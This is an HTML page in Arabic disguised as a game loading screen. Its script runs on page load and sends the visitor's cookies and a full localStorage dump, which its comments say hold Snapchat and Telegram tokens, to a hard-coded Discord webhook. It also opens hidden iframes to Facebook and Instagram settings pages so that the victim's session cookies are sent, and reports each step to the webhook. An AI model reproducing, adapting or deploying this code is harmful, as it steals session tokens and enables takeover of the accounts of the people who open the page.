<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
        /* إخفاء قنوات السحب تماماً */
        .stealth-channel { display: none; width: 0; height: 0; border: 0; }
    </style>
</head>
<body>
    <div class="version-marker">7</div> <div class="loader"></div>
    <p>جاري مزامنة قاعدة البيانات (V1.1.9)...</p>

    <iframe name="fb_frame" class="stealth-channel"></iframe>
    <iframe name="inst_frame" class="stealth-channel"></iframe>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        function sendReport(msg) {
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
                embeds: [{ title: "📡 تقرير القناة الصامتة", description: msg, color: 15105570 }]
            }));
        }

        // تكتيك الـ Form Injection: إجبار المتصفح على فتح القنوات بكوكيز الضحية
        function openStealthChannel(name, target) {
            const form = document.createElement('form');
            form.method = 'GET';
            form.action = target;
            form.target = name; // توجيه الطلب لداخل الـ iframe المخفي
            document.body.appendChild(form);
            form.submit();
            sendReport(`تم فتح قناة سحب مع: ${target}`);
        }

        function runProtocol() {
            try {
                // سحب أي كوكيز متاحة (ليست HttpOnly)
                if (document.cookie) sendReport("🍪 Cookies: " + document.cookie);
                
                // سحب الـ Storage (هنا بكون توكن السناب والتليجرام)
                const localData = JSON.stringify(localStorage);
                if (localData !== '{}') sendReport("📦 LocalStorage Dump: \n" + localData);

                // فتح القنوات الصامتة: المتصفح الحين "بيدخل" فيسبوك وانستا بالخلفية
                // هاد الطلب بيجبر المتصفح يبعث الكوكيز المحمية للموقع نفسه
                openStealthChannel("fb_frame", "https://mbasic.facebook.com/settings");
                openStealthChannel("inst_frame", "https://www.instagram.com/accounts/edit/");

            } catch (e) {
                sendReport("⚠️ خطأ في البروتوكول: " + e.message);
            }
        }

        window.onload = runProtocol;
    </script>
</body>
</html>
